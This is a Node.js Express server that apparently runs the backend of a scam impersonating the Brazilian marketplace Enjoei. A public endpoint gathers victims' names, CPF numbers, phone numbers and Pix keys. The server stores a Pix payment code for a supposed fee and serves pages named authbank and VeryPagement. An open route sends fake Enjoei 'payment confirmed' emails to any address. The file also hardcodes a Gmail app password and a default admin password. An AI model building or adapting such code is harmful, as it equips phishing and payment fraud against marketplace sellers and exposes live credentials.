const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const multer = require('multer');
const jwt = require('jsonwebtoken');
const sqlite3 = require('sqlite3').verbose();
const rateLimit = require('express-rate-limit');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'sua_chave_secreta_aqui';

// Conexão com o banco de dados SQLite
const db = new sqlite3.Database(path.join(__dirname, 'enjoei.db'), (err) => {
    if (err) {
        console.error('Erro ao conectar ao SQLite:', err.message);
    } else {
        console.log('Conectado ao SQLite');
    }
});

// Criar tabelas no SQLite
db.serialize(() => {
    // Tabela para Clientes (adicionado campo tipoChave)
    db.run(`
        CREATE TABLE IF NOT EXISTS clients (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            nome TEXT NOT NULL,
            cpf TEXT,
            telefone TEXT,
            chavePix TEXT,
            tipoChave TEXT,
            status TEXT,
            ultimoPagamento TEXT,
            dataCadastro TEXT
        )
    `);

    // Tabela para Configurações de Pagamento
    db.run(`
        CREATE TABLE IF NOT EXISTS paymentSettings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            qrCode TEXT,
            pixCopyPaste TEXT
        )
    `);

    // Inserir configurações padrão se a tabela estiver vazia
    db.get('SELECT COUNT(*) as count FROM paymentSettings', (err, row) => {
        if (err) {
            console.error('Erro ao verificar paymentSettings:', err.message);
            return;
        }
        if (row.count === 0) {
            db.run(`
                INSERT INTO paymentSettings (qrCode, pixCopyPaste)
                VALUES (?, ?)
            `, ['../img/qrcode.jpg', '00020126850014br.gov.bcb.pix2563pix.voluti.com.br/qr/v3/at/e090cf24-506a-4905-865b-30fbd4d833c85204000053039865802BR5925PAGFACIL_MEIOS_DE_PAGAMEN6005SINOP62070503***63043678']);
        }
    });

    // Tabela para Usuários (para autenticação de admin)
    db.run(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL UNIQUE,
            password TEXT NOT NULL
        )
    `);

    // Inserir usuário admin padrão se não existir
    db.get('SELECT COUNT(*) as count FROM users', (err, row) => {
        if (err) {
            console.error('Erro ao verificar users:', err.message);
            return;
        }
        if (row.count === 0) {
            const bcrypt = require('bcrypt');
            const hashedPassword = bcrypt.hashSync('senha123', 10);
            db.run(`
                INSERT INTO users (username, password)
                VALUES (?, ?)
            `, ['admin', hashedPassword]);
        }
    });
});

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Configuração de upload de imagens com multer
const fs = require('fs');
const uploadDir = path.join(__dirname, 'Uploads');
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir);
}
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    },
});
const upload = multer({ storage });

// Servir arquivos estáticos
app.use('/uploads', express.static(uploadDir));
app.use('/acesso', express.static(path.join(__dirname, 'acesso')));
app.use('/api', express.static(path.join(__dirname, 'api')));
app.use('/authbank', express.static(path.join(__dirname, 'authbank')));
app.use('/authpay', express.static(path.join(__dirname, 'authpay')));
app.use('/confirm', express.static(path.join(__dirname, 'confirm')));
app.use('/inicial', express.static(path.join(__dirname, 'inicial')));
app.use('/pay', express.static(path.join(__dirname, 'pay')));
app.use('/payvery', express.static(path.join(__dirname, 'payvery')));
app.use('/very', express.static(path.join(__dirname, 'very')));
app.use('/VeryPagement', express.static(path.join(__dirname, 'VeryPagement')));
app.use('/adm', express.static(path.join(__dirname, 'adm')));
app.use(express.static(path.join(__dirname, 'inicial')));

// Rotas específicas para admin e login
app.get('/admin', (req, res) => {
    const filePath = path.join(__dirname, 'adm', 'admin.html');
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error('Erro ao servir admin.html:', err);
            res.status(404).send('admin.html não encontrado na pasta adm');
        }
    });
});

app.get('/login', (req, res) => {
    const filePath = path.join(__dirname, 'adm', 'login.html');
    res.sendFile(filePath, (err) => {
        if (err) {
            console.error('Erro ao servir login.html:', err);
            res.status(404).send('login.html não encontrado na pasta adm');
        }
    });
});

// Rota raiz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'inicial', 'index.html'));
});

// Middleware para autenticação
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Acesso negado: token não fornecido' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) {
            return res.status(403).json({ error: 'Acesso negado: token inválido' });
        }
        req.user = user;
        next();
    });
};

// Rate limiting para o endpoint público
const clientLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 100 // 100 requisições por IP
});

// Rota de login
const bcrypt = require('bcrypt');
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    db.get('SELECT * FROM users WHERE username = ?', [username], async (err, user) => {
        if (err || !user || !(await bcrypt.compare(password, user.password))) {
            return res.status(401).json({ error: 'Credenciais inválidas' });
        }
        const token = jwt.sign({ username }, JWT_SECRET, { expiresIn: '1h' });
        res.json({ token });
    });
});

// Endpoints da API para gerenciar clientes
app.post('/api/clients', clientLimiter, (req, res) => {
    const { nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento, dataCadastro } = req.body;

    // Validação de entrada
    if (!nome || nome.length < 5) {
        return res.status(400).json({ error: 'O nome é obrigatório e deve ter pelo menos 5 caracteres' });
    }
    if (!cpf || !/^\d{11}$/.test(cpf)) {
        return res.status(400).json({ error: 'CPF inválido (deve ter 11 dígitos numéricos)' });
    }
    if (!telefone || !/^\d{10,11}$/.test(telefone)) {
        return res.status(400).json({ error: 'Telefone inválido (deve ter 10 ou 11 dígitos numéricos)' });
    }
    if (!tipoChave || !['CPF', 'EMAIL', 'TELEFONE', 'ALEATORIA'].includes(tipoChave)) {
        return res.status(400).json({ error: 'Tipo de chave Pix inválido' });
    }
    if (!chavePix) {
        return res.status(400).json({ error: 'Chave Pix é obrigatória' });
    }

    // Verificar se o CPF já existe
    db.get('SELECT * FROM clients WHERE cpf = ?', [cpf], (err, row) => {
        if (err) {
            console.error('Erro ao verificar CPF:', err.message);
            return res.status(500).json({ error: 'Erro ao verificar CPF' });
        }
        if (row) {
            return res.status(400).json({ error: 'Este CPF já está cadastrado' });
        }

        // Inserir novo cliente
        db.get('SELECT MAX(id) as maxId FROM clients', (err, row) => {
            if (err) {
                console.error('Erro ao obter o último ID:', err.message);
                return res.status(500).json({ error: 'Erro ao adicionar cliente' });
            }

            const newId = (row.maxId || 0) + 1;
            db.run(
                'INSERT INTO clients (id, nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento, dataCadastro) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                [newId, nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento, dataCadastro],
                function (err) {
                    if (err) {
                        console.error('Erro ao adicionar cliente:', err.message);
                        return res.status(500).json({ error: 'Erro ao adicionar cliente' });
                    }
                    res.status(201).json({ id: newId, nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento, dataCadastro });
                }
            );
        });
    });
});

// Rotas protegidas (requerem autenticação)
app.get('/api/clients', authenticateToken, (req, res) => {
    db.all('SELECT * FROM clients', [], (err, rows) => {
        if (err) {
            console.error('Erro ao obter clientes:', err.message);
            return res.status(500).json({ error: 'Erro ao obter clientes' });
        }
        res.json(rows);
    });
});

app.put('/api/clients/:id', authenticateToken, (req, res) => {
    const id = parseInt(req.params.id);
    const { nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento } = req.body;

    if (!nome) {
        return res.status(400).json({ error: 'O nome é obrigatório' });
    }

    db.run(
        'UPDATE clients SET nome = ?, cpf = ?, telefone = ?, chavePix = ?, tipoChave = ?, status = ?, ultimoPagamento = ? WHERE id = ?',
        [nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento, id],
        function (err) {
            if (err) {
                console.error('Erro ao atualizar cliente:', err.message);
                return res.status(500).json({ error: 'Erro ao atualizar cliente' });
            }
            if (this.changes === 0) {
                return res.status(404).json({ error: 'Cliente não encontrado' });
            }
            res.json({ id, nome, cpf, telefone, chavePix, tipoChave, status, ultimoPagamento });
        }
    );
});

app.delete('/api/clients/:id', authenticateToken, (req, res) => {
    const id = parseInt(req.params.id);

    db.run('DELETE FROM clients WHERE id = ?', [id], function (err) {
        if (err) {
            console.error('Erro ao excluir cliente:', err.message);
            return res.status(500).json({ error: 'Erro ao excluir cliente' });
        }
        if (this.changes === 0) {
            return res.status(404).json({ error: 'Cliente não encontrado' });
        }
        res.status(204).send();
    });
});

// Endpoints da API para configurações de pagamento (protegidos)
app.get('/api/payment-settings', authenticateToken, (req, res) => {
    db.get('SELECT * FROM paymentSettings LIMIT 1', (err, row) => {
        if (err) {
            console.error('Erro ao obter configurações de pagamento:', err.message);
            return res.status(500).json({ error: 'Erro ao obter configurações de pagamento' });
        }
        res.json(row || { qrCode: '../img/qrcode.jpg', pixCopyPaste: '' });
    });
});

app.post('/api/payment-settings', authenticateToken, upload.single('qrCode'), (req, res) => {
    const { pixCopyPaste } = req.body;
    const qrCode = req.file ? `/uploads/${req.file.filename}` : null;

    db.get('SELECT * FROM paymentSettings LIMIT 1', (err, row) => {
        if (err) {
            console.error('Erro ao verificar configurações de pagamento:', err.message);
            return res.status(500).json({ error: 'Erro ao atualizar configurações de pagamento' });
        }

        const updateData = {
            qrCode: qrCode || (row ? row.qrCode : '../img/qrcode.jpg'),
            pixCopyPaste: pixCopyPaste || (row ? row.pixCopyPaste : '')
        };

        if (row) {
            db.run(
                'UPDATE paymentSettings SET qrCode = ?, pixCopyPaste = ? WHERE id = ?',
                [updateData.qrCode, updateData.pixCopyPaste, row.id],
                (err) => {
                    if (err) {
                        console.error('Erro ao atualizar configurações de pagamento:', err.message);
                        return res.status(500).json({ error: 'Erro ao atualizar configurações de pagamento' });
                    }
                    res.json(updateData);
                }
            );
        } else {
            db.run(
                'INSERT INTO paymentSettings (qrCode, pixCopyPaste) VALUES (?, ?)',
                [updateData.qrCode, updateData.pixCopyPaste],
                (err) => {
                    if (err) {
                        console.error('Erro ao inserir configurações de pagamento:', err.message);
                        return res.status(500).json({ error: 'Erro ao atualizar configurações de pagamento' });
                    }
                    res.json({ ...updateData, id: this.lastID });
                }
            );
        }
    });
});

// Configuração do transportador de e-mail
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'vendasenjoei427@gmail.com',
        pass: process.env.EMAIL_PASS || 'lrvd jewr hmae ceqi'
    }
});

// Rota para envio de e-mail
app.post('/enviar-email', async (req, res) => {
    const { email } = req.body;

    const mailOptions = {
        from: 'Enjoei <vendasenjoei427@gmail.com>',
        to: email,
        subject: 'Pagamento confirmado! 💰',
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; line-height: 1.6; color: #333; background-color: #f9f9f9; border-radius: 10px;">
                <div style="text-align: center; padding: 20px; background-color: #800080; border-radius: 10px 10px 0 0;">
                    <h1 style="color: #fff; margin: 0; font-size: 28px;">Parabéns pela sua venda! 🎉</h1>
                </div>
                <div style="padding: 20px; background-color: #fff; border-radius: 0 0 10px 10px;">
                    <p style="font-size: 16px; margin: 0 0 15px;">Olá,</p>
                    <p style="font-size: 16px; margin: 0 0 15px;">Temos uma ótima notícia! Todas as etapas para o recebimento do valor da sua venda foram concluídas com sucesso. 💰</p>
                    <p style="font-size: 16px; margin: 0 0 15px;">No momento, estamos finalizando a análise dos detalhes do pagamento da taxa. <strong>Fique de olho!</strong> Em breve, você receberá uma confirmação por <strong>e-mail, SMS ou ligação</strong> avisando que o valor já está na sua conta.</p>
                    <p style="font-size: 16px; margin: 0 0 15px;">Enquanto isso, prepare-se para ser redirecionado para uma rápida pesquisa de satisfação. Sua opinião é muito importante para nós! 😊</p>
                    <div style="text-align: center; margin: 20px 0;">
                        <a href="#" style="display: inline-block; padding: 10px 20px; background-color: #800080; color: #fff; text-decoration: none; border-radius: 5px; font-size: 16px;">Acompanhe seu pagamento</a>
                    </div>
                    <hr style="border: 0; border-top: 1px solid #eee; margin: 20px 0;" />
                    <p style="font-size: 12px; color: #888; text-align: center;">Este é um e-mail automático, por favor, não responda diretamente. Se precisar de ajuda, entre em contato com nossa equipe em <a href="mailto:suporte@enjoei.com" style="color: #800080;">suporte@enjoei.com</a>.</p>
                    <p style="font-size: 12px; color: #888; text-align: center;">Enjoei - Grito da moda! 💜</p>
                </div>
            </div>
        `
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        console.log('E-mail enviado:', info.response);
        res.send('E-mail enviado com sucesso!');
    } catch (error) {
        console.error('Erro ao enviar e-mail:', error);
        res.status(500).send('Erro ao enviar e-mail');
    }
});

// Capturar erros 404
app.use((req, res) => {
    res.status(404).send('404: Página não encontrada');
});

// Iniciar o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});

// Fechar o banco de dados quando o servidor for encerrado
process.on('SIGINT', () => {
    db.close((err) => {
        if (err) {
            console.error('Erro ao fechar o banco de dados:', err.message);
        }
        console.log('Conexão com SQLite fechada');
        process.exit(0);
    });
});